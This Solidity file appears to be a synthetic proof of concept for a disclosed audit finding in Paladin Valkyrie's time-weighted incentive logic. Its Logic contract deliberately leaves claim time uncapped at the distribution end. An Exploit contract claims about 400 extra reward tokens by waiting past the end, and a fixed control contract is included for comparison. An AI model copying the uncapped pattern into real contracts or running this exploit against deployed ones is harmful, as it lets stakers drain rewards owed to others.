// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie — TimeWeightedIncentiveLogic pays more after the
    distribution has ended (Cyfrin / Draiakoo, finding #61564, 12 March 2025).

    SYNTHETIC, cheatcode-free. `nowTs` stands in for `block.timestamp`.
    _earnedTimeWeighted uses `timeDiff = now - checkpoint` with no cap at
    endTimestamp. A sole staker who waits 5 weeks to claim a 1-week, 1000 RWD
    stream receives 899.999834656084416960 RWD instead of the 499.999173280423147200
    due at the end. The extra is 400.000661375661269760 RWD.
    Control caps timeDiff at the distribution end, so that extra is 0. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Logic {
    uint256 public constant UNIT = 1e18;

    Token public reward;
    uint256 public nowTs;
    uint256 public totalLiquidity;
    uint256 public ratePerSec;
    uint256 public endTimestamp;
    uint256 public rewardLast;
    uint256 public rewardPerTokenStored;
    uint256 public requiredDuration;
    mapping(address => uint256) public userLiquidity;
    mapping(address => uint256) public userLast;
    mapping(address => uint256) public checkpointTimestamp;
    mapping(address => uint256) public checkpointDuration;

    constructor(Token _reward) {
        reward = _reward;
        nowTs = 1_700_000_000;
    }

    function advance(uint256 dt) external {
        nowTs += dt;
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        checkpointTimestamp[msg.sender] = nowTs;
        checkpointDuration[msg.sender] = 0;
    }

    function depositRewards(uint256 amount, uint256 duration) external {
        require(duration > 0 && totalLiquidity > 0, "duration");
        ratePerSec = amount / duration;
        endTimestamp = nowTs + duration;
        rewardLast = nowTs;
        requiredDuration = duration;
        reward.transferFrom(msg.sender, address(this), amount);
    }

    function claim() external returns (uint256 earnedAmount) {
        uint256 newRewardPerToken = _newRewardPerToken();
        earnedAmount = _earnedTimeWeighted(msg.sender, newRewardPerToken);
        userLast[msg.sender] = newRewardPerToken;
        rewardPerTokenStored = newRewardPerToken;
        uint256 applicable = nowTs < endTimestamp ? nowTs : endTimestamp;
        rewardLast = applicable;
        if (earnedAmount != 0) reward.transfer(msg.sender, earnedAmount);
    }

    function _newRewardPerToken() internal view returns (uint256) {
        if (totalLiquidity == 0) return rewardPerTokenStored;
        uint256 applicable = nowTs < endTimestamp ? nowTs : endTimestamp;
        return rewardPerTokenStored + (((applicable - rewardLast) * ratePerSec * UNIT) / totalLiquidity);
    }

    function _earnedTimeWeighted(address account, uint256 newRewardPerToken) internal view returns (uint256 earnedAmount) {
        if (userLast[account] == newRewardPerToken) return 0;
        uint256 userBalance = userLiquidity[account];
        uint256 maxDuration = requiredDuration;
        uint256 maxEarned = (userBalance * (newRewardPerToken - userLast[account])) / UNIT;
        uint256 duration = checkpointDuration[account];
        if (duration >= maxDuration) return maxEarned;

        uint256 lastUpdateTs = checkpointTimestamp[account];
        // @> VULN: timeDiff is not capped at endTimestamp, so waiting past the end raises the payout
        uint256 timeDiff = nowTs - lastUpdateTs;
        // FIX: timeDiff = min(nowTs, endTimestamp) - lastUpdateTs
        uint256 newDuration = duration + timeDiff;
        if (newDuration >= maxDuration) newDuration = maxDuration;
        uint256 ratio;
        if (newDuration >= maxDuration) {
            uint256 remainingIncreaseDuration = maxDuration - duration;
            uint256 left = ((((maxDuration - duration - 1) * UNIT) / 2) / maxDuration);
            ratio = ((left * remainingIncreaseDuration) + (UNIT * (timeDiff - remainingIncreaseDuration))) / timeDiff;
        } else {
            ratio = ((((newDuration - duration - 1) * UNIT) / 2) / maxDuration);
        }
        earnedAmount = (maxEarned * ratio) / UNIT;
    }
}

contract Funder {
    function fund(Logic logic, Token reward, uint256 amount, uint256 duration) external {
        reward.approve(address(logic), amount);
        logic.depositRewards(amount, duration);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    uint256 public constant FAIR = 499999173280423147200;
    uint256 public constant LATE = 899999834656084416960;
    uint256 public constant EXTRA = 400000661375661269760;

    Token public reward;
    Logic public logic;
    Funder public funder;
    uint256 public claimed;
    uint256 public kept;

    constructor() {
        reward = new Token("Reward", "RWD", 18); // nonce 1
        logic = new Logic(reward); // nonce 2
        funder = new Funder(); // nonce 3
    }

    function run() external {
        logic.stake(100 ether);
        reward.mint(address(funder), N);
        funder.fund(logic, reward, N, 1 weeks);
        logic.advance(5 weeks);
        claimed = logic.claim();
        require(claimed == LATE, "late claim");
        require(claimed - FAIR == EXTRA, "extra");
        reward.transfer(address(funder), FAIR);
        kept = reward.balanceOf(address(this));
        require(kept == EXTRA, "extra not kept");
    }
}

/// @dev Control: timeDiff stops at endTimestamp, so a claim five weeks later
///      pays the end-of-window amount and the post-end increment is 0.
contract LogicFixed {
    uint256 public constant UNIT = 1e18;

    Token public reward;
    uint256 public nowTs;
    uint256 public totalLiquidity;
    uint256 public ratePerSec;
    uint256 public endTimestamp;
    uint256 public rewardLast;
    uint256 public rewardPerTokenStored;
    uint256 public requiredDuration;
    mapping(address => uint256) public userLiquidity;
    mapping(address => uint256) public userLast;
    mapping(address => uint256) public checkpointTimestamp;
    mapping(address => uint256) public checkpointDuration;

    constructor(Token _reward) {
        reward = _reward;
        nowTs = 1_700_000_000;
    }

    function advance(uint256 dt) external {
        nowTs += dt;
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        checkpointTimestamp[msg.sender] = nowTs;
        checkpointDuration[msg.sender] = 0;
    }

    function depositRewards(uint256 amount, uint256 duration) external {
        require(duration > 0 && totalLiquidity > 0, "duration");
        ratePerSec = amount / duration;
        endTimestamp = nowTs + duration;
        rewardLast = nowTs;
        requiredDuration = duration;
        reward.transferFrom(msg.sender, address(this), amount);
    }

    function claim() external returns (uint256 earnedAmount) {
        uint256 newRewardPerToken = _newRewardPerToken();
        earnedAmount = _earned(msg.sender, newRewardPerToken);
        userLast[msg.sender] = newRewardPerToken;
        rewardPerTokenStored = newRewardPerToken;
        uint256 applicable = nowTs < endTimestamp ? nowTs : endTimestamp;
        rewardLast = applicable;
        if (earnedAmount != 0) reward.transfer(msg.sender, earnedAmount);
    }

    function _newRewardPerToken() internal view returns (uint256) {
        if (totalLiquidity == 0) return rewardPerTokenStored;
        uint256 applicable = nowTs < endTimestamp ? nowTs : endTimestamp;
        return rewardPerTokenStored + (((applicable - rewardLast) * ratePerSec * UNIT) / totalLiquidity);
    }

    function _earned(address account, uint256 newRewardPerToken) internal view returns (uint256 earnedAmount) {
        if (userLast[account] == newRewardPerToken) return 0;
        uint256 userBalance = userLiquidity[account];
        uint256 maxDuration = requiredDuration;
        uint256 maxEarned = (userBalance * (newRewardPerToken - userLast[account])) / UNIT;
        uint256 duration = checkpointDuration[account];
        if (duration >= maxDuration) return maxEarned;

        uint256 timeDiffEnd = endTimestamp;
        if (timeDiffEnd > nowTs) timeDiffEnd = nowTs;
        uint256 timeDiff = timeDiffEnd - checkpointTimestamp[account];
        uint256 newDuration = duration + timeDiff;
        if (newDuration >= maxDuration) newDuration = maxDuration;
        uint256 ratio;
        if (newDuration >= maxDuration) {
            uint256 remainingIncreaseDuration = maxDuration - duration;
            uint256 left = ((((maxDuration - duration - 1) * UNIT) / 2) / maxDuration);
            ratio = ((left * remainingIncreaseDuration) + (UNIT * (timeDiff - remainingIncreaseDuration))) / timeDiff;
        } else {
            ratio = ((((newDuration - duration - 1) * UNIT) / 2) / maxDuration);
        }
        earnedAmount = (maxEarned * ratio) / UNIT;
    }
}
